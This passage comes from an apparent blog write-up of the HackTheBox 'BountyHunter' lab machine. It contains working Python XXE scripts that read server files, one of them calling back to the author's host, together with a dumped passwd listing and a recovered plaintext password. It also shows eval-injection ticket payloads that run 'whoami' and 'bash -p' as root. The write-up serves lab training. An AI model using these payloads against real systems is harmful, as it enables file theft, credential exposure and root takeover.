systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
development:x:1000:1000:Development:/home/development:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
&lt;/td&gt;
<span class="o">&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>We have a development user account on the machine.</p>
<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>root@kali:~/ctf/htb/BountyHunter# python exp.py 
<span class="o">&gt;</span>/etc/apache2/sites-enabled/000-default.conf
&lt;td&gt;&lt;/td&gt;
<span class="o">&gt;</span>/var/www/html/index.php
&lt;td&gt;&lt;/td&gt;
<span class="o">&gt;</span>/home/development/.ssh/id_rsa
&lt;td&gt;&lt;/td&gt;
</pre></td></tr></tbody></table></code></div></div>

<p>I tried to read the apache configuration, in order to read the exact path location where the server files are hosted but i wasn’t successful in reading.</p>

<p>After observing, I was trying with a different payload using xxe for generate a request to my machine. If we have a request to our server then we might have SSRF.</p>

<h3 id="xxe">XXE</h3>

<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre></td><td class="rouge-code"><pre>from <span class="nb">base64 </span>import b64encode
import requests
from bs4 import BeautifulSoup


URL <span class="o">=</span> <span class="s2">"http://10.129.144.35/tracker_diRbPr00f314.php"</span>


<span class="k">while </span>True:
	FILE_TO_READ <span class="o">=</span> raw_input<span class="o">(</span><span class="s2">"&gt;"</span><span class="o">)</span>
	payload <span class="o">=</span> <span class="s1">'&lt;!DOCTYPE foo[\
	&lt;!ELEMENT foo ANY &gt;\
	&lt;!ENTITY xxe SYSTEM "http://10.10.14.178/{}"&gt; ]&gt;\
	&lt;bugreport&gt;\
	&lt;title&gt;aaa&lt;/title&gt;\
	&lt;cwe&gt;&amp;xxe;&lt;/cwe&gt;\
	&lt;cvss&gt;a&lt;/cvss&gt;\
	&lt;reward&gt;12000&lt;/reward&gt;\
	&lt;/bugreport&gt;'</span>.format<span class="o">(</span>FILE_TO_READ<span class="o">)</span>

	encoded_payload <span class="o">=</span> b64encode<span class="o">(</span>payload<span class="o">)</span>
	<span class="c"># print(encoded_payload)</span>

	r <span class="o">=</span> requests.post<span class="o">(</span>URL, <span class="nv">data</span><span class="o">={</span><span class="s1">'data'</span>:encoded_payload<span class="o">})</span>
	soup <span class="o">=</span> BeautifulSoup<span class="o">(</span>r.text, <span class="s1">'lxml'</span><span class="o">)</span>
	rows <span class="o">=</span> soup.find_all<span class="o">(</span><span class="s1">'td'</span><span class="o">)</span>
	print<span class="o">(</span>rows[3]<span class="o">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>I requested for a page which doesn’t exist on my system and the remote machine request a page from my system. Now we can ask the server to request the our page and load it. let’s try if it works.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210725082712.png" alt="[Pasted image 20210725082712.png]" /></p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210725082729.png" alt="[Pasted image 20210725082729.png]" /></p>

<p>It loaded the page but there was no reverse shell from the remote page.
<img data-proofer-ignore data-src="/assets/images/Pasted image 20210725082928.png" alt="[Pasted image 20210725082928.png]" /></p>

<p>As we load any page either local or remote, but we are mostly interested in loading the local file on the server. We can use php-filters which encode the page in base64 and send us the page.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210725083247.png" alt="[Pasted image 20210725083247.png]" /></p>

<p>Yay!!! Now we can read the server files which are hosted without knowing the exact path. Let’s rewrite the script to request and convert the payload from base64 into readable format for us.</p>

<div lang="python" class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64encode</span><span class="p">,</span><span class="n">b64decode</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>


<span class="n">URL</span> <span class="o">=</span> <span class="s">"http://10.129.101.90/tracker_diRbPr00f314.php"</span>


<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
	<span class="n">FILE_TO_READ</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">=</span> <span class="s">'&lt;!DOCTYPE foo[</span><span class="se">\
</span><span class="s">	&lt;!ELEMENT foo ANY &gt;</span><span class="se">\
</span><span class="s">	&lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={}"&gt; ]&gt;</span><span class="se">\
</span><span class="s">	&lt;bugreport&gt;</span><span class="se">\
</span><span class="s">	&lt;title&gt;aaa&lt;/title&gt;</span><span class="se">\
</span><span class="s">	&lt;cwe&gt;&amp;xxe;&lt;/cwe&gt;</span><span class="se">\
</span><span class="s">	&lt;cvss&gt;a&lt;/cvss&gt;</span><span class="se">\
</span><span class="s">	&lt;reward&gt;12000&lt;/reward&gt;</span><span class="se">\
</span><span class="s">	&lt;/bugreport&gt;'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">FILE_TO_READ</span><span class="p">)</span>

	<span class="n">encoded_payload</span> <span class="o">=</span> <span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
	<span class="c1"># print(encoded_payload)
</span>
	<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">'data'</span><span class="p">:</span><span class="n">encoded_payload</span><span class="p">})</span>
	<span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">,</span> <span class="s">'lxml'</span><span class="p">)</span>
	<span class="n">rows</span> <span class="o">=</span> <span class="n">soup</span><span class="p">.</span><span class="n">find_all</span><span class="p">(</span><span class="s">'td'</span><span class="p">)</span>
	<span class="n">filtered</span> <span class="o">=</span> <span class="n">b64decode</span><span class="p">(</span><span class="n">rows</span><span class="p">[</span><span class="mi">3</span><span class="p">].</span><span class="n">string</span><span class="p">)</span>
	<span class="k">print</span><span class="p">(</span><span class="n">filtered</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Using the script, i loaded the db.php file which has a user and password</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210725083542.png" alt="[Pasted image 20210725083542.png]" /></p>

<p>Now let’s see if the development user has used the same password.</p>

<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>User: development
Pass: m19RoAU0hP41A1sTsq6K
</pre></td></tr></tbody></table></code></div></div>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210725083742.png" alt="[Pasted image 20210725083742.png]" /></p>

<p>Yep! The user used the same password.</p>

<blockquote>
  <p><strong>Quick Tip:</strong> Never use same password for configuration and logins</p>
</blockquote>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210725084021.png" alt="[Pasted image 20210725084021.png]" /></p>

<p>We have our user flag. Now let’s escalate to root.</p>

<h3 id="root-privilege-escalation">Root Privilege Escalation</h3>

<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>development@bountyhunter:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>development on bountyhunter:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User development may run the following commands on bountyhunter:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
</pre></td></tr></tbody></table></code></div></div>

<p>We can run a python script <code class="language-plaintext highlighter-rouge">/opt/skytrain_inc/ticketValidator.py</code> as root on the remote server but we oon’t have permission to write to this file.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210725084237.png" alt="[Pasted image 20210725084237.png]" /></p>

<p>Let’s have a look at the script</p>

<div lang="python" class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
</pre></td><td class="rouge-code"><pre><span class="c1">#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.
</span>
<span class="k">def</span> <span class="nf">load_file</span><span class="p">(</span><span class="n">loc</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">loc</span><span class="p">.</span><span class="n">endswith</span><span class="p">(</span><span class="s">".md"</span><span class="p">):</span>
        <span class="k">return</span> <span class="nb">open</span><span class="p">(</span><span class="n">loc</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Wrong file type."</span><span class="p">)</span>
        <span class="nb">exit</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">evaluate</span><span class="p">(</span><span class="n">ticketFile</span><span class="p">):</span>
    <span class="c1">#Evaluates a ticket to check for ireggularities.
</span>    <span class="n">code_line</span> <span class="o">=</span> <span class="bp">None</span>
    <span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">x</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">ticketFile</span><span class="p">.</span><span class="n">readlines</span><span class="p">()):</span>
        <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">x</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">"# Skytrain Inc"</span><span class="p">):</span>
                <span class="k">return</span> <span class="bp">False</span>
            <span class="k">continue</span>
        <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">x</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">"## Ticket to "</span><span class="p">):</span>
                <span class="k">return</span> <span class="bp">False</span>
            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Destination: </span><span class="si">{</span><span class="s">' '</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="n">strip</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">)[</span><span class="mi">3</span><span class="p">:])</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
            <span class="k">continue</span>

        <span class="k">if</span> <span class="n">x</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">"__Ticket Code:__"</span><span class="p">):</span>
            <span class="n">code_line</span> <span class="o">=</span> <span class="n">i</span><span class="o">+</span><span class="mi">1</span>
            <span class="k">continue</span>

        <span class="k">if</span> <span class="n">code_line</span> <span class="ow">and</span> <span class="n">i</span> <span class="o">==</span> <span class="n">code_line</span><span class="p">:</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">x</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">"**"</span><span class="p">):</span>
                <span class="k">return</span> <span class="bp">False</span>
            <span class="n">ticketCode</span> <span class="o">=</span> <span class="n">x</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"**"</span><span class="p">,</span> <span class="s">""</span><span class="p">).</span><span class="n">split</span><span class="p">(</span><span class="s">"+"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>            
            <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">ticketCode</span><span class="p">)</span> <span class="o">%</span> <span class="mi">7</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>                
                <span class="n">validationNumber</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"**"</span><span class="p">,</span> <span class="s">""</span><span class="p">))</span>
                <span class="k">if</span> <span class="n">validationNumber</span> <span class="o">&gt;</span> <span class="mi">100</span><span class="p">:</span>
                    <span class="k">return</span> <span class="bp">True</span>
                <span class="k">else</span><span class="p">:</span>
                    <span class="k">return</span> <span class="bp">False</span>
    <span class="k">return</span> <span class="bp">False</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">fileName</span> <span class="o">=</span> <span class="s">"390681613.md"</span><span class="c1">#input("Please enter the path to the ticket file.\n")
</span>    <span class="n">ticket</span> <span class="o">=</span> <span class="n">load_file</span><span class="p">(</span><span class="n">fileName</span><span class="p">)</span>
    <span class="c1">#DEBUG print(ticket)
</span>    <span class="n">result</span> <span class="o">=</span> <span class="n">evaluate</span><span class="p">(</span><span class="n">ticket</span><span class="p">)</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">result</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Valid ticket."</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Invalid ticket."</span><span class="p">)</span>
    <span class="n">ticket</span><span class="p">.</span><span class="n">close</span>

<span class="n">main</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The script reads a ticket file and does some checks and then return the value on the terminal.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210725084413.png" alt="[Pasted image 20210725084413.png]" /></p>

<p>Then interesting thing is it uses <code class="language-plaintext highlighter-rouge">eval</code> function</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210725084547.png" alt="[Pasted image 20210725084547.png]" /></p>

<p>After going through how the code works, I generated a payload</p>

<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>development@bountyhunter:~<span class="nv">$ </span><span class="nb">cat </span>sample.md 
<span class="c"># Skytrain Inc</span>
<span class="c">## Ticket to New Haven</span>
__Ticket Code:__
<span class="k">**</span>32+410+86+int<span class="o">(</span><span class="nb">eval</span><span class="o">(</span><span class="s2">"__import__('os').system('whoami')"</span><span class="o">))</span><span class="k">**</span>
<span class="c">##Issued: 2021/04/06</span>
<span class="c">#End Ticket</span>

</pre></td></tr></tbody></table></code></div></div>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210725084952.png" alt="[Pasted image 20210725084952.png]" /></p>

<p>We are root.</p>

<p>So let’s try to get a bash shell</p>

<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>development@bountyhunter:~<span class="nv">$ </span><span class="nb">cat </span>sample.md 
<span class="c"># Skytrain Inc</span>
<span class="c">## Ticket to New Haven</span>
__Ticket Code:__
<span class="k">**</span>32+410+86+int<span class="o">(</span><span class="nb">eval</span><span class="o">(</span><span class="s2">"__import__('os').system('bash -p')"</span><span class="o">))</span><span class="k">**</span>
<span class="c">##Issued: 2021/04/06</span>
<span class="c">#End Ticket</span>
</pre></td></tr></tbody></table></code></div></div>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210725085132.png" alt="[Pasted image 20210725085132.png]" /></p>

<p>And we the flag.</p>

<p>Fairly good box, with XXE explot and analysing code.</p>

<p>Any suggestions, please do write me at tinyb0y@protonmail.com</p>


      </div>

      <div class="post-tail-wrapper text-muted">

        <!-- categories -->
        

        <div class="post-meta mb-3">
          <i class="far fa-folder-open fa-fw mr-1"></i>
          
            <a href='/categories/hackthebox/'>hackthebox</a>,
            <a href='/categories/linux/'>linux</a>
        </div>
        

        <!-- tags -->
        
        <div class="post-tags">
          <i class="fa fa-tags fa-fw mr-1"></i>
          
          <a href="/tags/hackthebox/"
            class="post-tag no-text-decoration" >hackthebox</a>
          
          <a href="/tags/easy/"
            class="post-tag no-text-decoration" >easy</a>
          
          <a href="/tags/xxe/"
            class="post-tag no-text-decoration" >XXE</a>
          
          <a href="/tags/python/"
            class="post-tag no-text-decoration" >python</a>
          
          </div>
        

        <div class="post-tail-bottom
          d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
          <div class="license-wrapper">
          
            
            This post is licensed under 
            <a href="https://creativecommons.org/licenses/by/4.0/">
              CC BY 4.0
            </a>
             by the author.
          
          </div>

          <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=BountyHunter HTB - tinyb0y&url=http://0.0.0.0:4000/posts/BountyHunter/" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=BountyHunter HTB - tinyb0y&u=http://0.0.0.0:4000/posts/BountyHunter/" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://telegram.me/share?text=BountyHunter HTB - tinyb0y&url=http://0.0.0.0:4000/posts/BountyHunter/" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i class="fa-fw fas fa-link small" onclick="copyLink('', 'Link copied successfully!')"
        data-toggle="tooltip" data-placement="top"
        title="Copy link">
    </i>

  </span>
</div>


        </div><!-- .post-tail-bottom -->

      </div><!-- div.post-tail -->

    </div> <!-- .post -->


  </div> <!-- #post-wrapper -->

  

  

  <!--
  The Pannel on right side (Desktop views)
-->





<div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down">

  <div class="access">

  














  

  















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  
    <div id="access-tags">
      <span>Trending Tags</span>
      <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

      
        
        <a class="post-tag" href="/tags/hackthebox/">hackthebox</a>
      
        
        <a class="post-tag" href="/tags/active-directory/">active directory</a>
      
        
        <a class="post-tag" href="/tags/easy/">easy</a>
      
        
        <a class="post-tag" href="/tags/hacks/">hacks</a>
      
        
        <a class="post-tag" href="/tags/hard/">hard</a>
      
        
        <a class="post-tag" href="/tags/linux/">linux</a>
      
        
        <a class="post-tag" href="/tags/ldap/">ldap</a>
      
        
        <a class="post-tag" href="/tags/tryhackme/">tryhackme</a>
      
        
        <a class="post-tag" href="/tags/windows/">windows</a>
      
        
        <a class="post-tag" href="/tags/bloodhound/">bloodhound</a>
      

      </div>
    </div>
  
  </div> <!-- .access -->

  
    <!-- BS-toc.js will be loaded at medium priority -->
    <script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>
    <div id="toc-wrapper" class="pl-0 pr-4 mb-5">
      <span class="pl-3 pt-2 mb-2">Contents</span>
      <nav id="toc" data-toggle="toc"></nav>
    </div>
  

</div> <!-- #panel-wrapper -->


</div> <!-- .row -->

<div class="row">
  <div class="col-12 col-lg-11 col-xl-8">
    <div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

    <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  
    
  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->






  <div id="related-posts" class="mt-5 mb-2 mb-sm-4">
    <h3 class="pt-2 mt-1 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/posts/Previse/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->






<span class="timeago small"
  >Jan  8<i class="unloaded">2022-01-08T05:30:00+05:30</i>
</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Previse HTB</h3>
            <div class="text-muted small">
              <p>
                





                


An easy box with an unvalidated redirection vulnerability, access to registration page and dump the file sitebackup.zip and exploit a post parameter to get remote code execution on the machine. ...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/Pikaboo/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->






<span class="timeago small"
  >Dec  4, 2021<i class="unloaded">2021-12-04T05:30:00+05:30</i>
</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Pikaboo HTB</h3>
            <div class="text-muted small">
              <p>
                





                

A very tough box with a good knowlege of webservers and perl scripting and a bit of code workthrough.


  Nmap
  Recon
  Nginx/Apache Misconfiguration
  FootHold
  User escalation
  Root Privileg...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/Writer/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->






<span class="timeago small"
  >Dec 11, 2021<i class="unloaded">2021-12-11T05:30:00+05:30</i>
</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Writer HTB</h3>
            <div class="text-muted small">
              <p>
                





                Writer


A very good box with a good knowledge on how postfix filters work and  ubuntu apt installer.


  Nmap
  Recon
  SQL Injection
  FootHold
  User escalation
  Root Privilege Escalation


Nma...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->



    <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/posts/ASMIBypass/" class="btn btn-outline-primary"
    prompt="Older">
    <p>Building a C2 that will bypass ASMI</p>
  </a>
  

  
